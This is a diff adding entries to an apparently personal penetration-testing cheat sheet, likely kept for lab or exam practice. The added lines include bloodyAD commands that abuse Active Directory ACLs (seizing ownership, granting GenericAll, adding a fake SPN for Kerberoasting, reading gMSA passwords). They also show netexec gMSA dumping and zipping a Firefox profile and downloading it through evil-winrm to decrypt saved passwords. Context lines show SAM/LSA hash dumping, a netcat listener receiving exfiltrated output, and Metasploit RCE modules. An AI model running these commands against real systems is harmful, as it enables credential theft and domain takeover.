@@ -36,7 +36,8 @@ toc: true
 
 - **Check for Quick wins , PS history , Config files .**
 - **Check downloaded Programs that are unsual .**
-
+- **Check Active Directory Section .**
+  
 ### Domains :
 
 - **Always run nxc on all IPs to get the computer names , identify servers and DCs .**
@@ -1306,7 +1307,15 @@ On our machine we set up the python server : python3 -m http.server 80
 
 cat test.py | base64 > d 
 
-Now we can execute the encoded file inside the other machine, if we have only  Python . 
+Now we can execute the encoded file inside the other machine, if we have only  Python .
+
+# Via Evil-winrm :
+
+==> To compress a folder for easy transfer :
+
+Compress-Archive -Path "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr" -DestinationPath "C:\Windows\Temp\ff.zip"
+download ff.zip
+
 ```
 
 ## Windows Priv Esc :
@@ -1660,6 +1669,8 @@ netexec smb $target -u 'admin' -p 'password' --lsa.
 
 netexec smb $target -u 'user' -p 'password' --sam | fgrep -v '[' | awk -F '{print $4}' | tee dumped_hashes.txt  : Give us the NTLM hash only . 
 
+nxc ldap $target -u 'eng.payload' -p 'WEAK123.' --gmsa : Only if we have ReadGMSA rights over a service account . 
+
 # If machine has AV : 
 
 netexec smb $target -u 'user' -p 'password' -M lsassy | fgrep -v '[' | awk '{print $6}' | tee dumped_hashes.txt  : Give us the NTLM hash only . 
@@ -1725,6 +1736,26 @@ bloodyad  --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF'
 
 # WriteAccountRestrictions : To remove a specific ACL (Eg : Enable a specific account ) :
 bloodyad --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' remove uac 'svc.services' -f ACCOUNTDISABLE
+
+# Remove Group Member :
+bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' remove groupMember 'GROUP' 'TARGET'
+
+# WriteOwner ==> Make ourselves the owner (Owner has WriteDACL that we can abuse to add new ACLs) :
+bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' set owner 'TARGET' 'YOURUSER'
+
+# WriteDacl ==> We can grant ourselves GenericAll over that user :
+bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' add genericAll 'TARGET' 'YOURUSER'
+
+# WriteAccountRestrictions - Enable disabled account :
+bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' remove uac 'TARGET' -f ACCOUNTDISABLE
+
+# GenericWrite - Targeted Kerberoasting (Add SPN) :
+bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' set object 'TARGET' --attr servicePrincipalName -v 'fake/spn'
+
+# ReadGMSAPassword :
+bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' get object 'ACCOUNT$' --attr msDS-ManagedPassword
+nxc ldap $target -u 'YOURUSER' -p 'YOURPASS' --gmsa
+
 
 # ACL Check : to verify the User's ACLs via Powershell : 
 $user = Get-DomainUser svc-backup
@@ -2029,7 +2060,7 @@ use exploit/unix/http/pfsense_graph_injection_exec
 Now on our machine we do : nc -lnvp 9001 > filesystem.txt 
 This will output the command result from the find command onto the filesystem.txt file . 
 #The ${HOME} is just a / since the / is banned , we used that to bypass it 
-Since we did env command  from earlier and we go that $HOME is / . 
+Since we did env command  from earlier and we go that $HOME is / .
 
 ```
 
@@ -2042,3 +2073,16 @@ Search for dbpassword or smt like that .
 # Authenticated Command Injection : 
 exploit/windows/http/prtg_authenticated_rce : This will give us a Shell . 
 ```
+
+### Firefox Priv Esc :
+
+```bash
+Location for Firefox Profiles :
+On Windows : 
+C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles
+
+Tool to decrypt the passwords :
+https://github.com/unode/firefox_decrypt/
+
+```
+
